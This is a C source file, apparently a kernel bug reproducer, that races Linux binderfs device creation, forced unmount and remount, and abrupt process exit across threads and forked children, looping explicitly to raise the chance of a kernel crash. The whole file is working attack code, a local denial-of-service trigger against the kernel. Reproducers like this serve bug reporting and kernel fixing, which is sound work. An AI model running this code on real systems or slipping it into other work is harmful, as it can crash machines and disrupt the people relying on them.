//gcc reproducer.c -o reproducer -lpthread
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDERFS_MAX_NAME 255
#define BINDER_CTL_ADD _IOWR('b', 1, struct binderfs_device)

struct binderfs_device {
    char name[BINDERFS_MAX_NAME + 1];
    __u32 major;
    __u32 minor;
};

static void setup_binderfs(void) {
    if (mkdir("/dev/binderfs", 0755) && errno != EEXIST) {
        perror("mkdir /dev/binderfs");
        return;
    }
    
    if (mount("binder", "/dev/binderfs", "binder", 0, NULL)) {
        perror("mount binderfs");
        return;
    }
}

static void* race_thread(void* arg) {
    int id = (long)arg;
    char path[256];
    int fd;
    struct binderfs_device device;
    
    for (int i = 0; i < 100; i++) {
        // Create binder device
        snprintf(device.name, sizeof(device.name), "test%d_%d", id, i);
        
        fd = open("/dev/binderfs/binder-control", O_RDONLY);
        if (fd >= 0) {
            ioctl(fd, BINDER_CTL_ADD, &device);
            close(fd);
        }
        
        // Try to open the device
        snprintf(path, sizeof(path), "/dev/binderfs/%s", device.name);
        fd = open(path, O_RDWR);
        if (fd >= 0) {
            close(fd);
        }
        
        // Force unmount/remount to trigger eviction
        if (id == 0) {
            umount2("/dev/binderfs", MNT_FORCE | MNT_DETACH);
            usleep(1000);
            setup_binderfs();
        }
        
        usleep(100);
    }
    return NULL;
}

static void trigger_exit_race(void) {
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        setup_binderfs();
        
        pthread_t threads[4];
        for (int i = 0; i < 4; i++) {
            pthread_create(&threads[i], NULL, race_thread, (void*)(long)i);
        }
        usleep(50000);
        // Exit abruptly to trigger the race in do_exit()
        _exit(0);
    } else if (pid > 0) {
        // Parent waits and kills child if needed
        sleep(1);
        kill(pid, SIGKILL);
        waitpid(pid, NULL, 0);
    }
}

int main(void) {
    // Setup initial binderfs
    setup_binderfs();
    // Run multiple iterations to increase crash probability
    for (int round = 0; round < 50; round++) {
        printf("Round %d\n", round);
        for (int proc = 0; proc < 3; proc++) {
            pid_t pid = fork();
            if (pid == 0) {
                trigger_exit_race();
                _exit(0);
            }
        }
        while (wait(NULL) > 0);
        
        usleep(10000);
    }
    // Cleanup
    umount("/dev/binderfs");
    return 0;
}